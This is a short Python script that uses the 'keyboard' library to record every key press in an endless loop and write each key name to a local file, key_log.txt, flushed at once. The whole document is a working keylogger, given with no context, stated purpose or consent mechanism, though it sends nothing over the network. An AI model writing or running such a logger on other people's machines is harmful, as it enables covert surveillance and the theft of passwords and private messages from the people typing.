import keyboard

# Open a file to store the keystrokes
with open('key_log.txt', 'w') as log_file:
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            # Write the key name to the file
            log_file.write(event.name + '\n')
            log_file.flush()  # save immediately
